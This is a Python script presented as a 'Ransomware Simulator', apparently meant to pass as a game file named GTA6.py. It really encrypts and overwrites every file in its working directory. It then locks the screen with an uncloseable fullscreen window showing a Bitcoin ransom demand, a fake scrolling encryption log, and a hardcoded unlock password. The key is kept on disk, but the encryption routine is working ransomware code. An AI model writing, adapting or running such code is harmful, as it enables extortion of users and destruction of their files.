#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import threading
import time
import random

# Set your secret password here
CORRECT_PASSWORD = "1234"  # You can change this password!

# Create a list to hold files
files = []

# For animation (fake file paths)
fake_files = [
    "C:/Users/Admin/Documents/report.docx",
    "C:/Users/Admin/Pictures/vacation.jpg",
    "C:/Users/Admin/Desktop/notes.txt",
    "C:/Users/Admin/Videos/family.mp4",
    "C:/Users/Admin/Downloads/setup.exe",
    "C:/Users/Admin/Documents/tax_2023.xlsx",
    "C:/Users/Admin/Music/lofi.mp3",
    "C:/Users/Admin/Projects/python_script.py",
    "C:/Users/Admin/Games/savegame.dat",
    "C:/Users/Admin/Desktop/passwords.txt",
    "C:/Users/Admin/Documents/invoice.pdf",
    "C:/Users/Admin/Pictures/meme.png"
]

# File encryption animation
def simulate_encryption(listbox):
    while True:
        file = random.choice(fake_files)
        listbox.insert(tk.END, f"Encrypting {file}...")
        listbox.yview(tk.END)  # Auto-scroll
        time.sleep(0.7)

# Encryption function
def encryption():
    # Discover files in the current directory (excluding folders, itself, decryptor, and key file)
    for file in os.listdir():
        if file == "GTA6.py" or file == "thekey.key":
            continue
        if os.path.isfile(file):
            files.append(file)

    # Generate encryption key
    key = Fernet.generate_key()

    # Save the key to a file
    with open("thekey.key", "wb") as thekey:
        thekey.write(key)
    print("[+] Key saved successfully.")

    # Encrypt each file
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        contents_encrypted = Fernet(key).encrypt(contents)
        with open(file, "wb") as f:
            f.write(contents_encrypted)


# Decryption function
def decrypt():
    try:
        files = []
        for file in os.listdir():
            if file in ["GTA6.py", "thekey.key"]:
                continue
            if os.path.isfile(file):
                files.append(file)

        # Load the key
        with open("thekey.key", "rb") as thekey:
            secret_key = thekey.read()

        # Decrypt files
        for file in files:
            with open(file, "rb") as f:
                contents = f.read()
            contents_decrypted = Fernet(secret_key).decrypt(contents)
            with open(file, "wb") as f:
                f.write(contents_decrypted)

        print("[+] Decryption successful.")
    except Exception as e:
        print("[!] Decryption failed:", str(e))


# Check the password
def check_password(password_entry, root_window):
    entered_password = password_entry.get()  # Get the text from the entry field
    if entered_password == CORRECT_PASSWORD:
        decrypt()
        messagebox.showinfo("Success", "Password accepted! Files decrypted!")
        root_window.destroy()  # Close the Tkinter window
    else:
        messagebox.showerror("Error", "Incorrect password. Try again!")
        password_entry.delete(0, tk.END)  # Clear the entry field for a new attempt


# Main GUI function
def show_ransom_screen():
    root = tk.Tk()
    root.attributes("-fullscreen", True)
    root.config(bg="black")
    root.title("Ransomware Simulator")

    ransom_msg = tk.Label(
        root, text="⚠️ Your files have been encrypted! ⚠️",
        font=("Arial", 36, "bold"), fg="red", bg="black"
    )
    ransom_msg.pack(pady=20)

    details = tk.Label(
        root, text="Pay $500 in Bitcoin to the address below to recover your files.\n"
                   "BTC Address: youtube-Omal_Raj\n"
                   "Failure to pay will result in permanent loss of your data.",
        font=("Arial", 16), fg="white", bg="black"
    )
    details.pack(pady=10)

    timer_label = tk.Label(root, font=("Arial", 20), fg="yellow", bg="black")
    timer_label.pack(pady=10)

    # Listbox for fake file encryption
    list_frame = tk.Frame(root, bg="black")
    list_frame.pack(pady=10)
    listbox = tk.Listbox(list_frame, width=80, height=10, font=("Courier", 12), bg="black", fg="lime")
    listbox.pack(side="left", fill="y")

    scrollbar = tk.Scrollbar(list_frame, orient="vertical")
    scrollbar.config(command=listbox.yview)
    scrollbar.pack(side="right", fill="y")
    listbox.config(yscrollcommand=scrollbar.set)

    # Start background threads
    threading.Thread(target=simulate_encryption, args=(listbox,), daemon=True).start()
    threading.Thread(target=encryption, args=(), daemon=True).start()  # Start encryption

    # --- Password Entry Field ---
    password_label = tk.Label(
        root, text="Or enter password to decrypt:",
        font=("Arial", 14), fg="white", bg="black"
    )
    password_label.pack(pady=5)

    password_entry = tk.Entry(
        root, show="*", font=("Arial", 14), width=30, bg="white", fg="black"
    )
    password_entry.pack(pady=5)

    # --- Password Submit Button ---
    password_submit_button = tk.Button(
        root, text="Submit Password",
        command=lambda: check_password(password_entry, root),  # Pass the entry widget and root window
        font=("Arial", 14), bg="blue", fg="white"
    )
    password_submit_button.pack(pady=10)

    # This line prevents closing with the 'X' button, forcing password entry
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.mainloop()


# Run the ransomware simulation
show_ransom_screen()
